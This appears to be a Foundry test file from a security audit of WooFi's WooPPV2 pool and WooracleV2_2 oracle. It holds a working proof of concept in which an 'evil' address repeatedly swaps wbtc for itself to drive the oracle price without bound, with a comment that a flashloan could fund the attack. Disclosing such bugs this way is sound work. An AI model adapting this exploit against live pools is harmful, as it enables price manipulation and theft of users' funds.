// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "../../lib/forge-std/src/Test.sol";
import {console2} from "../../lib/forge-std/src/console2.sol";
import {WooracleV2_2} from "../../contracts/wooracle/WooracleV2_2.sol";
import {WooPPV2} from "../../contracts/WooPPV2.sol";
import {TestERC20Token} from "../../contracts/test/TestERC20Token.sol";
import {TestUsdtToken} from "../../contracts/test/TestUsdtToken.sol";

contract TestWbctToken is TestERC20Token {
    function decimals() public view virtual override returns (uint8) {
        return 8;
    }
}

contract PriceManipulationAttackTest is Test {
    WooracleV2_2 oracle;
    WooPPV2 pool;
    TestUsdtToken usdt;
    TestWbctToken wbtc;
    address evil = address(0xbad);

    function setUp() public {
        usdt = new TestUsdtToken();
        wbtc = new TestWbctToken();
        oracle = new WooracleV2_2();
        pool = new WooPPV2(address(usdt));

        // parameters reference: Integration_WooPP_Fee_Rebate_Vault.test.ts
        pool.setMaxGamma(address(wbtc), 0.1e18);
        pool.setMaxNotionalSwap(address(wbtc), 5_000_000e6);
        pool.setFeeRate(address(wbtc), 25);
        oracle.postState({_base: address(wbtc), _price: 50_000e8, _spread: 0.001e18, _coeff: 0.000000001e18});
        oracle.setWooPP(address(pool));
        oracle.setAdmin(address(pool), true);
        pool.setWooracle(address(oracle));

        // add some initial liquidity
        usdt.mint(address(this), 10_000_000e6);
        usdt.approve(address(pool), type(uint256).max);
        pool.depositAll(address(usdt));

        wbtc.mint(address(this), 100e8);
        wbtc.approve(address(pool), type(uint256).max);
        pool.depositAll(address(wbtc));
    }

    function testMaxPriceDriftInNormalCase() public {
        (uint256 initPrice, bool feasible) = oracle.price(address(wbtc));
        assertTrue(feasible);
        assertEq(initPrice, 50_000e8);

        // buy almost all wbtc in pool
        usdt.mint(address(this), 5_000_000e6);
        usdt.transfer(address(pool), 5_000_000e6);
        pool.swap({
            fromToken: address(usdt),
            toToken: address(wbtc),
            fromAmount: 5_000_000e6,
            minToAmount: 0,
            to: address(this),
            rebateTo: address(this)
        });

        (uint256 pastPrice, bool feasible2) = oracle.price(address(wbtc));
        assertTrue(feasible2);
        uint256 drift = ((pastPrice - initPrice) * 1e5) / initPrice;
        assertEq(drift, 502); // 0.502%
        console2.log("Max price drift in normal case: ", _toPercentString(drift));
    }

    function testUnboundPriceDriftInAttackCase() public {
        (uint256 initPrice, bool feasible) = oracle.price(address(wbtc));
        assertTrue(feasible);
        assertEq(initPrice, 50_000e8);

        // top up the evil, in real case, the fund could be from a flashloan
        wbtc.mint(evil, 100e8);

        for (uint256 i; i < 10; ++i) {
            vm.startPrank(evil);
            uint256 balance = wbtc.balanceOf(evil);
            wbtc.transfer(address(pool), balance);
            pool.swap({
                fromToken: address(wbtc),
                toToken: address(wbtc),
                fromAmount: balance,
                minToAmount: 0,
                to: evil,
                rebateTo: evil
            });
            (uint256 pastPrice, bool feasible2) = oracle.price(address(wbtc));
            assertTrue(feasible2);
            uint256 drift = ((pastPrice - initPrice) * 1e5) / initPrice;
            console2.log("Unbound price drift in attack case: ", _toPercentString(drift));    
            vm.stopPrank();
        }
    }

    function _toPercentString(uint256 drift) internal pure returns (string memory result) {
        uint256 d_3 = drift % 10;
        uint256 d_2 = (drift / 10) % 10;
        uint256 d_1 = (drift / 100) % 10;
        uint256 d0 = (drift / 1000) % 10;
        result = string.concat(_toString(d0), ".", _toString(d_1), _toString(d_2), _toString(d_3), "%");
        uint256 d = drift / 10000;
        while (d > 0) {
            result = string.concat(_toString(d % 10), result);
            d = d / 10;
        }
    }

    function _toString(uint256 digital) internal pure returns (string memory str) {
        str = new string(1);
        bytes16 symbols = "0123456789abcdef";
        assembly {
            mstore8(add(str, 32), byte(digital, symbols))
        }
    }
}